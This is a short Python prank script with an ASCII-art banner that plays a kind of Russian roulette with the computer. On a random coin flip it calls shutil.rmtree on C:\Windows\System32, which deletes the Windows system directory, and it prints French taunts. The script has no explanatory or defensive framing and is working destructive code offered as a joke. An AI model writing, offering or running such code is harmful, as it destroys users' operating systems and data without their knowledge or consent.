#####################################
# _ ____                            #
#(_)___ \                           #
# _  __) |_   _____  _ __ _   _     #
#| ||__ <\ \ / / _ \| '__| | | |    #
#| |___) |\ V / (_) | |  | |_| |    #
#|_|____/  \_/ \___/|_|   \__, |    #
#                          __/ |    #
#                         |___/     #
#####################################
import shutil
import random

pathTest = r"C:\Windows\System32"
nb = random.randint(0, 1)

if(nb == 1):
    shutil.rmtree(pathTest)
    print("Le fichier c'est ciao")

else: 
    print("t'as de la chance")
